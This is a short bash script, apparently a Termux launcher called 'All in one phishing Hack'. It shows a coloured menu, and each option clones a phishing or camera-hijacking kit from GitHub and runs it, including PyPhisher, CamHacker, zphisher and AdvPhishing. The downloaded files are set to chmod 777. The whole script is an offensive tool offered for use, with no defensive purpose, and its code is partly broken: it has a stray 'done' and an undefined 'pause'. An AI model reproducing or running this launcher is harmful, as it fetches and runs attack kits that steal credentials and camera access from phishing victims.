
# colour 
Black="\033[1;30m"       # Black
Red="\033[1;31m"         # Red
Green="\033[1;32m"       # Green
Yellow="\033[1;33m"      # Yellow
Blue="\033[1;34m"        # Blue
Purple="\033[1;35m"      # Purple
Cyan="\033[1;36m"        # Cyan
White="\033[1;37m"       # White

clear
apt-get update
apt-get upgrade
apt-get install python
apt-get install python3
clear
echo -e "$Green Created By \e[1;34m"
       figlet Jaan | lolcat
sleep 2.0

    echo " "
    echo -e "$Red                               ⫸ Coded by$Yellow h_hck7$Red ⫷\033[0m"
    echo -e "$Red                               ⫸$Purple How are u all$Red ⫷\033[0m"
echo " "
echo -e " $Red       ||----------------------------$Cyan [All in one phishing Hack] $Blue ---------------------------||"
echo -e " $Red       ||                                                                    ||"
echo -e " $Red       ||             $Purple%=>$Yellow[1️⃣] Pyphisher$Blue                     ||"
echo -e " $Red       ||             $Purple%=>️$Yellow[2️⃣] Camera Phishing$Blue             ||"
echo -e " $Red       ||             $Purple%=>$Yellow[3️⃣] zphisher$Blue                                  ||"
echo -e " $Red       ||             $Purple%=>$Yellow[4️⃣] Advance phishing$Blue                                ||"
echo -e " $Red       ||             $Purple%=>$Yellow[5️⃣] Update Phishing_tools$Blue                                    ||"
echo -e " $Red       ||             $Purple%=>$Yellow[6️⃣] Remove Phishing_tools$Blue                                    ||"
echo -e " $Red       ||             $Purple%=>$Yellow[7️⃣] About $Blue                                           ||"
echo -e " $Red       ||             $Purple%=>$Yellow[8️⃣] exit$Blue                                            ||"
echo -e " $Red       ||                                                                    ||"                                                                                       
echo -e " $Red       ||---------------------------$Cyan [select option] $Blue -----------------------||"
echo -e " $Blue      |---------------------------------------------------------------------|"
echo " "
echo " "

    read ch
   if [ $ch -eq 1 ];then
        cd $HOME
        git clone https://github.com/KasRoudra/PyPhisher
        cd PyPhisher
        python3 pyphisher.py

        exit
    elif [ $ch -eq 2 ];then 
         cd $HOME
         git clone https://github.com/KasRoudra/CamHacker
         cd CamHacker
         bash ch.sh
         
        
        exit
    elif [ $ch -eq 3 ];then
        git clone git://github.com/htr-tech/zphisher.git
        cd zphisher
        bash zphisher.sh

        exit
    elif [ $ch -eq 4 ];then
        git clone https://github.com/Ignitetch/AdvPhishing.git
        cd AdvPhishing/
        chmod 777 *
        ./Android-Setup.sh
       ./AdvPhishing.sh


        exit
    elif [ $ch -eq 5 ];then
        echo -e "\e[1;34m Downloading Latest Files..."
        cd $HOME
        rm -rf Xteam
        git clone https://github.com/xploitstech/Xteam
        cd Xteam
        bash Xteam.sh
     
        exit
   elif [ $ch -eq 6 ];then 
        cd $HOME
        rm -rf Phishing_tools
        
        exit
   elif [ $ch -eq 7 ];then
        echo -e  "\e[1;34m Downloading Latest Files..."
        

        
        
    else
        echo -e "\e[4;32m Invalid Input !!! \e[0m"
        pause
    fi
done
